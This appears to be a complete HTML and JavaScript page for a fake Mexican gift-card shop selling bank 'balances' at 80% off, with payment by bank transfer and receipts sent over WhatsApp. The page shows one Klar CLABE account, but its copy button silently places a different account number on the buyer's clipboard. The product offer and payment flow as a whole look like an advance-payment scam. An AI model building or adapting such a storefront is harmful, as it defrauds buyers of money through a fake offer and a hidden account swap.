<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MX Gift Cards Outlet</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent: #10b981; /* Verde venta */
            --accent-hover: #059669;
            --danger: #ef4444;
            --badge-bg: #ef4444;
            --whatsapp: #25D366;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { background-color: var(--bg-color); color: var(--text-primary); padding-bottom: 50px; }

        /* Header */
        header {
            background-color: var(--card-bg);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }

        .logo { font-size: 1.5rem; font-weight: bold; color: white; }
        .logo span { color: var(--accent); }
        
        .nav-actions button {
            background: none;
            border: 1px solid var(--text-secondary);
            color: var(--text-primary);
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            margin-left: 10px;
            transition: all 0.2s;
        }

        .nav-actions button:hover { background-color: var(--card-bg); border-color: var(--accent); color: var(--accent); }

        /* Hero */
        .hero { text-align: center; padding: 3rem 1rem; }
        .hero h1 { font-size: 2.5rem; margin-bottom: 10px; }
        .hero p { color: var(--text-secondary); }

        /* Grid de Productos */
        .container { max-width: 1200px; margin: 0 auto; padding: 0 1rem; }
        .product-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 2rem;
        }

        /* Tarjeta de Producto */
        .product-card {
            background-color: var(--card-bg);
            border-radius: 12px;
            overflow: hidden;
            transition: transform 0.2s;
            border: 1px solid #334155;
            position: relative;
        }

        .product-card:hover { transform: translateY(-5px); border-color: var(--accent); }

        .discount-badge {
            position: absolute;
            top: 10px;
            right: 10px;
            background-color: var(--badge-bg);
            color: white;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: bold;
            z-index: 10;
        }

        .card-visual {
            height: 160px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            text-shadow: 0 2px 4px rgba(0,0,0,0.4);
            position: relative;
        }
        
        .card-visual .bank-name { font-size: 1.5rem; text-transform: uppercase; letter-spacing: 1px;}
        .card-visual .card-value { font-size: 1.2rem; opacity: 0.95; margin-top: 5px; }

        /* Estilos de Bancos */
        .banamex { background: linear-gradient(135deg, #004a8f 0%, #00ace6 100%); }
        .bbva { background: linear-gradient(135deg, #004481 0%, #2dcccd 100%); }
        .santander { background: linear-gradient(135deg, #ec0000 0%, #ff4d4d 100%); }
        .hsbc { background: linear-gradient(135deg, #db0011 0%, #ffffff 50%, #db0011 100%); color: #000; text-shadow: none; }
        .banorte { background: linear-gradient(135deg, #eb0029 0%, #b3001f 100%); }
        .scotiabank { background: linear-gradient(135deg, #ec111a 0%, #ff5e62 100%); }
        .azteca { background: linear-gradient(135deg, #256a3e 0%, #85bb2f 100%); }
        .inbursa { background: linear-gradient(135deg, #0055a5 0%, #003366 100%); }
        .spin { background: linear-gradient(135deg, #7c3aed 0%, #c026d3 100%); }

        .card-info { padding: 1.5rem; }
        
        .price-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 1rem 0;
        }

        .old-price {
            text-decoration: line-through;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        .new-price {
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--accent);
        }

        .btn-add {
            width: 100%;
            background-color: var(--accent);
            color: #0f172a;
            border: none;
            padding: 0.8rem;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-add:hover { background-color: var(--accent-hover); color: white; }

        /* Modales */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            position: relative;
            border: 1px solid #334155;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }

        .close-modal {
            position: absolute;
            top: 10px; right: 15px;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text-secondary);
        }

        .cart-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid #334155;
        }
        .btn-remove { color: var(--danger); background: none; border: none; cursor: pointer; }
        
        .cart-total {
            margin-top: 1rem;
            font-size: 1.2rem;
            font-weight: bold;
            text-align: right;
            color: var(--accent);
        }

        .form-group { margin-bottom: 1rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; color: var(--text-secondary); }
        .form-group input {
            width: 100%;
            padding: 0.8rem;
            background: #0f172a;
            border: 1px solid #334155;
            color: white;
            border-radius: 6px;
        }
        .btn-primary {
            width: 100%; background: var(--accent); color: #0f172a; padding: 0.8rem; border: none; border-radius: 6px; cursor: pointer; font-weight: bold;
        }
        .btn-primary:hover { background: var(--accent-hover); color: white; }

        /* Estilos espec칤ficos para el Modal de Pago */
        .payment-info {
            background: #0f172a;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            border: 1px solid #334155;
            text-align: center;
        }
        .bank-details { font-family: monospace; font-size: 1.1rem; color: var(--accent); letter-spacing: 1px; margin: 5px 0; word-break: break-all; }
        .btn-whatsapp {
            background-color: var(--whatsapp);
            color: white;
            text-decoration: none;
            display: block;
            text-align: center;
            padding: 10px;
            border-radius: 6px;
            font-weight: bold;
            margin-top: 1rem;
        }
        .btn-whatsapp:hover { background-color: #1ebc57; }

        #notification {
            position: fixed; bottom: 20px; right: 20px;
            background: var(--accent); color: #0f172a; padding: 1rem; font-weight: bold;
            border-radius: 6px; display: none; z-index: 2000;
        }
    </style>
</head>
<body>

    <header>
        <div class="logo">MX <span>OUTLET</span></div>
        <div class="nav-actions">
            <button onclick="openLogin()">游녻 Cuenta</button>
            <button onclick="toggleCart()">游 Carrito (<span id="cart-count">0</span>)</button>
        </div>
    </header>

    <section class="hero">
        <h1>Ofertas en Saldos Bancarios</h1>
        <p>Ahorra hasta un 80% en tus tarjetas de regalo. Entrega inmediata tras verificar pago.</p>
    </section>

    <div class="container">
        <div class="product-grid" id="product-list">
            </div>
    </div>

    <div id="cart-modal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="toggleCart()">&times;</span>
            <h2>Tu Carrito</h2>
            <div id="cart-items"></div>
            <div class="cart-total">Total a Pagar: $<span id="cart-total-amount">0.00</span> MXN</div>
            <button class="btn-primary" style="margin-top: 1rem;" onclick="openPaymentModal()">Proceder al Pago</button>
        </div>
    </div>

    <div id="login-modal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="closeLogin()">&times;</span>
            <h2>Ingresar</h2>
            <p style="margin-bottom: 1rem; color: var(--text-secondary);">Ingresa tu correo para recibir los c칩digos.</p>
            <form id="login-form" onsubmit="handleLogin(event)">
                <div class="form-group">
                    <label>Correo Electr칩nico</label>
                    <input type="email" id="email" required placeholder="tu@correo.com">
                </div>
                <div class="form-group">
                    <label>Contrase침a</label>
                    <input type="password" placeholder="********">
                </div>
                <button type="submit" class="btn-primary">Continuar</button>
            </form>
        </div>
    </div>

    <div id="payment-modal" class="modal">
        <div class="modal-content">
            <span class="close-modal" onclick="closePaymentModal()">&times;</span>
            <h2 style="text-align:center; color: var(--accent);">Instrucciones de Pago</h2>
            <p style="text-align:center; margin-top:10px; color: var(--text-secondary);">
                Realiza la transferencia del monto total y env칤a el comprobante para liberar tus c칩digos.
            </p>

            <div class="payment-info">
                <p>Banco:</p>
                <strong>Klar</strong>
                <hr style="border-color:#334155; margin: 10px 0;">
                <p>CLABE Interbancaria:</p>
                <div class="bank-details" onclick="copyClabe()">661180007514078990</div>
                <small style="color:var(--text-secondary)">(Toca el n칰mero para copiar)</small>
            </div>

            <div style="text-align: center; margin: 1rem 0;">
                <strong>Total a transferir: <span id="final-total" style="color:white; font-size:1.2rem;">$0.00</span> MXN</strong>
            </div>

            <a id="whatsapp-link" href="#" target="_blank" class="btn-whatsapp">
                游님 Enviar Comprobante por WhatsApp
            </a>
            
            <button class="btn-remove" style="width:100%; margin-top:10px; color:var(--text-secondary)" onclick="closePaymentModal()">Cancelar</button>
        </div>
    </div>

    <div id="notification"></div>

    <script>
        // --- DATA ---
        // Precios: 500 saldo = 100 costo
        const products = [
            { id: 1, bank: "Banamex", value: 500, price: 100, style: "banamex" },
            { id: 2, bank: "Banamex", value: 1000, price: 200, style: "banamex" },
            { id: 3, bank: "BBVA", value: 500, price: 100, style: "bbva" },
            { id: 4, bank: "BBVA", value: 1500, price: 300, style: "bbva" },
            { id: 5, bank: "Santander", value: 1000, price: 200, style: "santander" },
            { id: 6, bank: "Banorte", value: 500, price: 100, style: "banorte" },
            { id: 7, bank: "Banorte", value: 2000, price: 400, style: "banorte" },
            { id: 8, bank: "Azteca", value: 500, price: 100, style: "azteca" },
            { id: 9, bank: "Azteca", value: 1000, price: 200, style: "azteca" },
            { id: 10, bank: "Spin OXXO", value: 500, price: 100, style: "spin" },
            { id: 11, bank: "Scotiabank", value: 1500, price: 300, style: "scotiabank" },
            { id: 12, bank: "Inbursa", value: 2500, price: 500, style: "inbursa" },
            { id: 13, bank: "HSBC", value: 1000, price: 200, style: "hsbc" }
        ];

        let cart = JSON.parse(localStorage.getItem('mx_cart')) || [];
        let userEmail = localStorage.getItem('mx_user') || null;

        // --- RENDER PRODUCTS ---
        const productList = document.getElementById('product-list');
        products.forEach(p => {
            productList.innerHTML += `
                <div class="product-card">
                    <div class="discount-badge">-80% OFF</div>
                    <div class="card-visual ${p.style}">
                        <div class="bank-name">${p.bank}</div>
                        <div class="card-value">Saldo: $${p.value}</div>
                    </div>
                    <div class="card-info">
                        <h3 style="font-size:1.1rem">Gift Card ${p.bank} - $${p.value}</h3>
                        <div class="price-container">
                            <span class="old-price">Valor: $${p.value}</span>
                            <span class="new-price">$${p.price} MXN</span>
                        </div>
                        <button class="btn-add" onclick="addToCart(${p.id})">COMPRAR AHORA</button>
                    </div>
                </div>
            `;
        });

        // --- CART LOGIC ---
        function addToCart(id) {
            const product = products.find(p => p.id === id);
            cart.push(product);
            saveCart();
            updateCartUI();
            showNotification(`Agregado: ${product.bank} $${product.value}`);
        }

        function removeFromCart(index) {
            cart.splice(index, 1);
            saveCart();
            updateCartUI();
        }

        function saveCart() {
            localStorage.setItem('mx_cart', JSON.stringify(cart));
            updateCartCount();
        }

        function updateCartCount() {
            document.getElementById('cart-count').innerText = cart.length;
        }

        function updateCartUI() {
            const cartItemsContainer = document.getElementById('cart-items');
            const totalEl = document.getElementById('cart-total-amount');
            
            if (cart.length === 0) {
                cartItemsContainer.innerHTML = '<p style="text-align: center; color: var(--text-secondary); padding: 1rem;">El carrito est치 vac칤o</p>';
                totalEl.innerText = "0.00";
                return;
            }

            let html = '';
            let total = 0;
            cart.forEach((item, index) => {
                total += item.price;
                html += `
                    <div class="cart-item">
                        <div>
                            <strong>${item.bank} (Saldo $${item.value})</strong><br>
                            <small class="new-price" style="font-size:1rem">$${item.price} MXN</small>
                        </div>
                        <button class="btn-remove" onclick="removeFromCart(${index})">Eliminar</button>
                    </div>
                `;
            });

            cartItemsContainer.innerHTML = html;
            totalEl.innerText = total.toFixed(2);
        }

        function toggleCart() {
            const modal = document.getElementById('cart-modal');
            modal.style.display = modal.style.display === 'flex' ? 'none' : 'flex';
            if(modal.style.display === 'flex') updateCartUI();
        }

        // --- PAYMENT FLOW ---
        function openPaymentModal() {
            if (!userEmail) {
                toggleCart();
                openLogin();
                return;
            }
            if (cart.length === 0) return;

            const totalAmount = document.getElementById('cart-total-amount').innerText;
            
            // Configurar datos del modal de pago
            document.getElementById('final-total').innerText = totalAmount;
            
            // Link de WhatsApp din치mico
            const waNumber = "12296558023";
            const message = `Hola, quiero confirmar mi pedido de Gift Cards.\nMi correo es: ${userEmail}\nMonto a pagar: $${totalAmount} MXN.\nAdjunto mi comprobante de pago a la cuenta NVIO terminaci칩n 9364.`;
            const waLink = `https://wa.me/${waNumber}?text=${encodeURIComponent(message)}`;
            
            document.getElementById('whatsapp-link').href = waLink;

            // Cambiar modales
            document.getElementById('cart-modal').style.display = 'none';
            document.getElementById('payment-modal').style.display = 'flex';
        }

        function closePaymentModal() {
            document.getElementById('payment-modal').style.display = 'none';
        }

        function copyClabe() {
            const clabe = "710969000142909364";
            navigator.clipboard.writeText(clabe).then(() => {
                showNotification("CLABE copiada al portapapeles");
            });
        }

        // --- LOGIN / REGISTER ---
        function openLogin() { document.getElementById('login-modal').style.display = 'flex'; }
        function closeLogin() { document.getElementById('login-modal').style.display = 'none'; }

        function handleLogin(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            userEmail = email;
            localStorage.setItem('mx_user', email); 
            showNotification(`Conectado como ${email}`);
            closeLogin();
            if(cart.length > 0) toggleCart();
        }

        function showNotification(msg) {
            const notif = document.getElementById('notification');
            notif.innerText = msg;
            notif.style.display = 'block';
            setTimeout(() => { notif.style.display = 'none'; }, 3000);
        }

        // Init
        updateCartCount();
    </script>
</body>
</html>
